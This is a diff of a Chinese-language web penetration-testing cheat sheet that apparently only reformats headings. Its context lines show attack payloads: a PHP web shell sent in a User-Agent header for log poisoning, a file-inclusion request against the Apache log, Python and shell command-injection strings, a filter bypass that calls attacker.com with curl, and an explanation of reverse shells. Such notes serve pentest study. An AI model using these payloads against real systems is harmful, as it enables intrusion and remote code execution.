@@ -289,19 +289,19 @@ curl -A "<?php system($_GET['cmd']); ?>" http://target.com
 http://target.com/index.php?file=/var/log/apache2/access.log&cmd=id
 ```
 
----
 
-### Reverse Shell
 
-#### 定義與原理
+#### Reverse Shell
+
+##### 定義與原理
 讓目標主機主動連線回攻擊者，取得互動式 shell。
 
-#### 使用時機
+##### 使用時機
 - 已能執行命令或上傳 Webshell
 - RCE 無法看輸出 → 透過連線取得 shell
 - 避開防火牆限制入站流量
 
-#### 常見語法
+##### 常見語法
 
 **Bash**
 ```bash
@@ -348,7 +348,7 @@ http://target.com/code?input=__import__('os').system('ls')
 - `chr()` 組字串避開限制
 - base64 + `eval(decode)` 執行
 
----
+
 
 #### Command Injection
 - 將輸入納入系統指令執行，造成命令注入。
@@ -365,7 +365,7 @@ http://target.com/ping?host=127.0.0.1;id
 - URL encode → `%26%26id`
 - 空格繞過 → `$IFS`：`curl$IFShttp://attacker.com`
 
----
+
 
 #### Argument Injection
 - 控制指令參數內容，導致意外行為。
